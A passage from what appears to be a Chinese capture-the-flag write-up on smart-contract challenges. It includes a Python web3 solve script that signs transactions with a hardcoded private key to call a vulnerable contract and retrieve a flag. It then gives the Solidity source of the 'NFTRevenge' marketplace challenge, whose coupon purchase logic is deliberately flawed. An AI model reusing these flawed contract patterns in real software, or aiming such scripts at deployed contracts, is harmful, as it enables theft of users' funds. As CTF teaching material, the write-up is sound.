class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来使用这个账号进行攻击等操作即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token punctuation">,</span> HTTPProvider<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_longrpc_url <span class="token operator">=</span> <span class="token string">'http://140.210.195.172:8545'</span>w3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span>HTTPProvider<span class="token punctuation">(</span>rpc_url<span class="token punctuation">)</span><span class="token punctuation">)</span>private_key <span class="token operator">=</span> <span class="token string">'0xc94ffbd4bdfb143c9e2b4092f0b36024b21d23d09af4317ce67ef72b338f092d'</span>account <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>privateKeyToAccount<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>vul_addr <span class="token operator">=</span> <span class="token string">''</span>vul_abi <span class="token operator">=</span> <span class="token string">''</span>vul_contarct <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>vul_addr<span class="token punctuation">,</span> abi<span class="token operator">=</span>vul_abi<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    TransactionData <span class="token operator">=</span> vul_contarct<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'CallTest'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>vul_addr<span class="token punctuation">,</span><span class="token string">"_Cal(uint256,uint256)"</span><span class="token punctuation">,</span><span class="token string">"0x00000000000000000000000000000000000000000000000000000000000000aa"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>        <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>        <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>        <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>    txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>txrecipet<span class="token punctuation">)</span>TransactionData <span class="token operator">=</span> vul_contarct<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'getFlag'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>txrecipet<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里在攻击时没有仔细看服务端的脚本，导致request flag时一直输入的是旧的token，导致一直报错，最后发现是这个问题，所以这里要注意细心细心再细心。</p><h1 id="NFTRevenge"><a href="#NFTRevenge" class="headerlink" title="NFTRevenge"></a>NFTRevenge</h1><p>本题作为0ctf中NFT market的延续，使用了solidity编译器0.8.16，并且做出了一点小小的改动。</p><h2 id="题目源码-1"><a href="#题目源码-1" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC721/ERC721.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/Ownable.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CtfNFT</span> <span class="token keyword">is</span> ERC721<span class="token punctuation">,</span> Ownable <span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC721</span><span class="token punctuation">(</span><span class="token string">"CtfNFT"</span><span class="token punctuation">,</span> <span class="token string">"NFT"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">_setApprovalForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token punctuation">{</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">CtfToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">{</span>    <span class="token builtin">bool</span> airdropped<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"CtfToken"</span><span class="token punctuation">,</span> <span class="token string">"CTK"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">_mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">airdrop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>airdropped<span class="token punctuation">,</span> <span class="token string">"Already airdropped"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        airdropped <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">Order</span> <span class="token punctuation">{</span>    <span class="token builtin">address</span> nftAddress<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> tokenId<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> price<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">Coupon</span> <span class="token punctuation">{</span>    <span class="token builtin">uint256</span> orderId<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> newprice<span class="token punctuation">;</span>    <span class="token builtin">address</span> issuer<span class="token punctuation">;</span>    <span class="token builtin">address</span> user<span class="token punctuation">;</span>    <span class="token builtin">bytes</span> reason<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">Signature</span> <span class="token punctuation">{</span>    <span class="token builtin">uint8</span> v<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> rs<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">SignedCoupon</span> <span class="token punctuation">{</span>    Coupon coupon<span class="token punctuation">;</span>    Signature signature<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">CtfMarket</span> <span class="token punctuation">{</span>    <span class="token keyword">event</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">NFTListed</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> seller<span class="token punctuation">,</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> nftAddress<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> tokenId<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> price    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">NFTCanceled</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> seller<span class="token punctuation">,</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> nftAddress<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> tokenId    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">NFTBought</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> buyer<span class="token punctuation">,</span>        <span class="token builtin">address</span> <span class="token keyword">indexed</span> nftAddress<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> tokenId<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> price    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> tested<span class="token punctuation">;</span>    CtfNFT <span class="token keyword">public</span> ctfNFT<span class="token punctuation">;</span>    CtfToken <span class="token keyword">public</span> ctfToken<span class="token punctuation">;</span>    CouponVerifierBeta <span class="token keyword">public</span> verifier<span class="token punctuation">;</span>    Order<span class="token punctuation">[</span><span class="token punctuation">]</span> orders<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ctfToken <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtfToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfToken<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfNFT <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtfNFT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfNFT<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>ctfNFT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfNFT<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfNFT<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        verifier <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CouponVerifierBeta</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Order</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>ctfNFT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Order</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>ctfNFT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Order</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>ctfNFT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13333333337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getOrder</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> orderId<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>Order <span class="token keyword">memory</span> order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>orderId <span class="token operator">&lt;</span> orders<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token string">"Invalid orderId"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        order <span class="token operator">=</span> orders<span class="token punctuation">[</span>orderId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">createOrder</span><span class="token punctuation">(</span><span class="token builtin">address</span> nftAddress<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">,</span> <span class="token builtin">uint256</span> price<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>price <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid price"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">isNFTApprovedOrOwner</span><span class="token punctuation">(</span>nftAddress<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Not owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Order</span><span class="token punctuation">(</span>nftAddress<span class="token punctuation">,</span> tokenId<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">NFTListed</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> nftAddress<span class="token punctuation">,</span> tokenId<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> orders<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">cancelOrder</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> orderId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        Order <span class="token keyword">memory</span> order <span class="token operator">=</span> <span class="token function">getOrder</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">isNFTApprovedOrOwner</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Not owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">NFTCanceled</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">purchaseOrder</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> orderId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        Order <span class="token keyword">memory</span> order <span class="token operator">=</span> <span class="token function">getOrder</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> nft<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfToken<span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> order<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>        nft<span class="token punctuation">.</span><span class="token function">safeTransferFrom</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">NFTBought</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">,</span> order<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">purchaseWithCoupon</span><span class="token punctuation">(</span>SignedCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"Invalid user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>newprice <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid price"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        verifier<span class="token punctuation">.</span><span class="token function">verifyCoupon</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">)</span><span class="token punctuation">;</span>        Order <span class="token keyword">memory</span> order <span class="token operator">=</span> <span class="token function">getOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> price <span class="token operator">=</span> order<span class="token punctuation">.</span>price<span class="token punctuation">;</span>        <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> nft<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        ctfToken<span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC721</span><span class="token punctuation">(</span><span class="token function">getOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">safeTransferFrom</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">NFTBought</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>newprice<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">purchaseTest</span><span class="token punctuation">(</span><span class="token builtin">address</span> nftAddress<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">,</span> <span class="token builtin">uint256</span> price<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>tested<span class="token punctuation">,</span> <span class="token string">"Tested"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tested <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> orderId <span class="token operator">=</span> <span class="token function">CtfMarket</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createOrder</span><span class="token punctuation">(</span>nftAddress<span class="token punctuation">,</span> tokenId<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>        nft<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">CtfMarket</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">purchaseOrder</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>ctfNFT<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender <span class="token operator">&amp;&amp;</span> ctfNFT<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender <span class="token operator">&amp;&amp;</span> ctfNFT<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isNFTApprovedOrOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> nftAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> nft<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>spender <span class="token operator">==</span> owner <span class="token operator">||</span> nft<span class="token punctuation">.</span><span class="token function">isApprovedForAll</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> 